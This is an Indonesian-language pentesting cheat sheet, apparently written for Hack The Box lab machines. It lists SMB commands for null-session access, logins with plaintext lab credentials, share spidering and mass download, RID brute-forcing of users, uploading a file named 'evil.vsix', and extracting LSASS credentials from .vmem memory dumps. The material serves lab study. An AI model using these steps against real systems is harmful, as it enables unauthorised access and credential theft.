SMB itu seperti **"Google Drive versi LAN"** — kamu bisa akses file di komputer lain seolah-olah ada di lokal.

# Null Session
```shell
smbclient -L //10.129.244.81/ -N
smbclient //10.129.244.81/<share> -N

nxc smb 10.129.244.81 -u '' -p ''

smbmap -H 10.129.244.81 -u Guest -p ''
```

# Login
```shell
nxc smb darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares 
```

# Explore
cari sensitif file yang extensionnnya .config atau exe, cari terbuat dari apa lalu decompile file tersebut, grep password, kalau dapat credential gas login smb dengan creds itu

kalau SYSVOL dan NETLOGON pada SMB, dipastikan mesin tersebut adalah Domain Controller, cek share itu dulu.
```shell
# Otomatis semua share
nxc smb 10.129.9.129 -u 'alex.turner' -p 'Checkpoint2024!' -M spider_plus

#untuk null session
smbclient //10.129.244.81/<share> -N

#untuk authenticated session
smbclient //10.129.244.81/<share> -U <user>

#download semuanya
smbclient /10.129.244.81/<share> -U username 
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

#alternative kalau smblient tidak bisa
smbmap -H 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' -r | tee smbmap.txt
smbmap -H 10.129.245.130 -u wallace.everette -p Welcome2026@ --download './Logs/IdentitySync_Trace_20260219.log'
```

# List User
```shell
# jika nama ada akhiran $, berarti itu adalah computer account  
nxc smb 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --rid-brute | tee listuser.txt
```

# Upload
```shell
smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
```

# Shares
## 1. VMBackups
- Cek `.vmem` 
  karena itu RAM dump — tempat LSASS hidup dan menyimpan credential. Gunakan `vol` (Kalau filenya kecil) untuk di luar shell windows atau gunakan `vmkatz` (jika file terlalu besar untuk di download) untuk di dalam shell
